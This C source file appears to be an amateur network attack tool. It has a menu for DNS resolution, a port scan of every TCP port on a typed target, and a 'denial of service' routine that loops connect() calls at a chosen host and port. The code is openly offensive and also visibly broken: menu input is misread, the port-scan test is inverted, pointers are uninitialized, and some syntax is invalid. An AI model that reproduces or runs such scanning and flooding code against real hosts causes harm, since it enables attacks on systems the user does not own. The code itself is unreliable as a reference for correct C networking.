//This Program does a DNS resolver, a ports scans and Denieal of service

#include <stdio.h>//uses to get input.
#include <netdb.h>//uses to work with socket.
#include <arpa/inet.h> // uses to work with InetNtoa method;
#include <sys/socket.h>// uses to work with socket.
#include <unistd.h>// uses to close the socket.


// Rosolves DNS.
void DNSResolver(char *target[])
{
    struct hostent *targetDomain = gethostbyname(target[0]);
    printf("IP: %s\n", inet_ntoa(*((struct in_addr *)targetDomain->h_addr)));
}

//Port Scan.
void PortScan(char *target[])
{
    int mySocket;
    int connectMySocket;
    char *destination = target[0];
    
    
    struct sockaddr_in targetSocket;

    for (int port=0;port<65535;port++)
    {
        mySocket = socket(AF_INET,SOCK_STREAM,0);
        targetSocket.sin_family = AF_INET;
        targetSocket.sin_port = htons(port);
        targetSocket.sin_addr.s_addr = inet_addr(destination);

        connectMySocket = connect(mySocket, (struct sockaddr *)&targetSocket, sizeof targetSocket);

        if(connectMySocket)
        {
            printf("The port %d is opened.\n",port);
            close(mySocket);
            close(connectMySocket);
        }
        else
        {
            close(mySocket);
            close(connectMySocket);
        }
    }
}

// DOS to a target
void DenialOfService(char *target[],  int port)
{
    int mySocket;
    int connectMySocket;
    char *destination = target[0];
   
    
    struct sockaddr_in targetSocket;

    /*Need put it in on string...*/
    mySocket = socket(AF_INET,SOCK_STREAM,0);
    targetSocket.sin_family = AF_INET;
    targetSocket.sin_port = htons(port);
    targetSocket.sin_addr.s_addr = inet_addr(destination);
    /*................................*/ 
    
    while (port != 0)
    {
        
        connectMySocket = connect(mySocket, (struct sockaddr *)&targetSocket, sizeof targetSocket);
        printf("The service is soffering DoS");

    }
}

void main ()
{
   printf ("type 1 to DNS resolver, 2 to prot scan and 3 to DoNS atack ");
   int input = scanf("%i",&input);

    
   switch (input)
    {
        case 1:
            printf("Type a target - eg: businesscorp.com.");
            char *target[] = {fgets(target[0],16,stdin)};
            DNSResolver(target);
            break;
        case 2:
            printf("Type a target - eg: IP adress.");
            *target = {fgets(target[0],16,stdin)};
            PortScan(target);
            break;
        case 3:
            printf("Type a target  - eg: IP adress.");
            *target = {fgets(target[0],16,stdin)};
            printf("Type a port- eg: IP 8080");
            int port = scanf("%i",&port);
            DenialOfService(target,port);
            break;
        default:
            printf("Please, you must type one number of menu");
            break;
        
        
    }
}